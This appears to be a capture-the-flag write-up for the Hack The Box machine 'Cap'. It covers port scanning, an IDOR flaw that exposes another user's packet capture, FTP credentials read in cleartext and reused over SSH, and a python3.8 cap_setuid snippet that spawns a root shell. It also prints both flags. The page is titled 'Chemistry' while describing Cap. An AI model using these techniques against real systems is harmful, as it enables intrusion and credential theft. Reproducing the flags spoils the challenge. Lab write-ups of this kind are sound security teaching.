# Chemistry %

<div align="left"><figure><img src="../.gitbook/assets/image (375).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure></div>

🔗 [Cap](https://www.hackthebox.com/machines/cap)

<details>

<summary>About</summary>



</details>

## Task 0 - Deploy machine

🎯 Target IP: `10.10.10.245`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.10.10.245 cap.htb" >> /etc/hosts
</strong>
mkdir -p htb/cap.htb
cd htb/cap.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 cap.htb
PING cap.htb (10.10.10.245) 56(84) bytes of data.
64 bytes from cap.htb (10.10.10.245): icmp_seq=6 ttl=63 time=77.8 ms
64 bytes from cap.htb (10.10.10.245): icmp_seq=9 ttl=63 time=80.1 ms
64 bytes from cap.htb (10.10.10.245): icmp_seq=11 ttl=63 time=51.5 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a **\*nix** system, while Windows systems usually have a TTL of 128 secs.

### 1.1 - How many TCP ports are open?

Let's start right away with an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv cap.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 3 open TCP ports on the machine: 21, 22, 80.

{% hint style="info" %}
3
{% endhint %}

Then, we can proceed to analyze services active on open ports:

```bash
sudo nmap -sV -sC -p 21,22,80 cap.htb -oN nmap/service_port_scan
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/2%Time=67767B84%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1FBC,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Thu,\x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\
SF:x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\
SF:x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Thu,\x2002\x20Jan\x202025\x2011:42:26\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Apart from the name of the web server 'Gunicorn' which I already knew we don't get much more information through whatweb.

```bash
whatweb cap.htb
http://cap.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Then, to understand the target scope, we can start to checking web server via browser:

<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

it is a dashboard view regarding security events, failed login attempts and more, going to 'Security Snapshot' we have a counter packet sniffer with the possiblity to download traffic captured.

<div align="left"><figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

while, selecting 'IP Config' we can see the network interface of attacker machine `10.10.10.245`

<div align="left"><figure><img src="../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

than, clicking 'Network Status' there's all current connections:

<div align="left"><figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

finally, the 'user tab' on top-right is only a mockup without functionality, but we'll track this name: 'Nathan', it can be useful for SSH and FTP services.

<div align="left"><figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Doing a directory enumeration with GoBuster tool and checking source page we don't discover others useful thing.

```bash
gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirb/common.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

### 1.2 - After running a "Security Snapshot", the browser is redirected to a path of the format /\[something]/\[id], where \[id] represents the id number of the scan. What is the \[something]?

This request is a good hint to understand which path to take, so let's try to generate some traffic with ICMP requests, and check if the traffic is captured.

<div align="left"><figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Indeed it is, and we can answer the question by displaying the url path.

{% hint style="info" %}
data
{% endhint %}

## Task 2 - Exploitation & User Flag

### 2.1 - Are you able to get to other users' scans?

Trying to use the ffuf tool with a wordlist of the most frequent users, I did not get any results.

An interesting thing to note in the Security Snapshot is the URL scheme when creating a new capture, which is in the format /data/ . The id is incremented for each capture.

<div align="left"><figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

I tried to insert different parameters and I found the presence of the vulnerability Insecure Direct Object Reference (IDOR) is a vulnerability that arises when attackers can access or modify objects by manipulating identifiers used in a web page.

It means that server should stores latest scans and it has been packet captures from users before us. I remember that i started to see /data/1, than browsing to /data/0 does indeed reveal a packet capture with multiple packets.

<div align="left"><figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Then, we can state the possibility to get scans of other users answering to the last question.

{% hint style="info" %}
yes
{% endhint %}

### 2.2 - What is the ID of the PCAP file that contains sensative data?

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Now, we can open pcap file (that has a reference with machine name) and analyze traffic using Wireshark, and searching ftp, http or others sensitive traffics in cleartext.

<div align="left"><figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

And here we immediately see a successful connection attempt on the FTP protocol of the previously mentioned user 'Nathan' with the relative password in cleartext.

{% hint style="info" %}
0
{% endhint %}

### 2.3 - Which application layer protocol in the pcap file can the sensitive data be found in?

The sensitive data is present in FTP protocol, these below is the complete TCP Stream:

<div align="left"><figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Great, now we know the password credentials for FTP service, we will also try it on SSH service.

{% hint style="info" %}
ftp
{% endhint %}

### 2.4 - We've managed to collect nathan's FTP password. On what other service does this password work?

Also anticipated, we can test credentials for FTP and SSH services.

#### FTP/21

`ftp nathan@cap.htb`

<div align="left"><figure><img src="../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

#### SSH/22

<div align="left"><figure><img src="../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Great, the credentials work on both services ;)

{% hint style="info" %}
SSH
{% endhint %}

2.5 - Submit the flag located in the nathan user's home directory.

We had already seen interesting files in the previous task, let's proceed with viewing the user flag in Nathan's folder.

\
![](<../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

f17ce10e2a6f6da2a5f4d76ebb61c401

</details>

## Task 3 - Privilege Escalation & Root Flag

### 3.1 - What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

Executing `sudo -l` command we can't see commands that user Nathan can execute with sudo privileges:

<div align="left"><figure><img src="../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Then first to use automated tools like as Linpeas, and remembering the hint of the question, i want to try to execute some useful commands:

```bash
crontab -l
cat /proc/version
getcap -r /2>/dev/null
```

<div align="left"><figure><img src="../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

checking cronjobs, potential kernel version and [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), we got an interesting output from linux capabilities only, so let's go ahead with that!&#x20;

Analyzing the first string of this output: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` we observe the presence of '[cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html)', therefore the capabily to elevate privileges to the python interpreter.&#x20;

<figure><img src="../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/usr/bin/python3.8
{% endhint %}

### 3.2 - Submit the flag located in root's home directory.

The goal is to set our setuid to 0 (root user), let's proceed.

We can change it directly on victim machine and executing OS commands via python3.8 interpreter: `usr/bin/python3.8`

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

and after setting uid to 0 we obtain root permission!

<div align="left"><figure><img src="../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

we complete by heading to the root folder to capture the root.txt flag: `cat /root/root.txt`

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

751fab1137897a30e64a45e099f8f9b7

</details>

<div align="left"><figure><img src="../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>
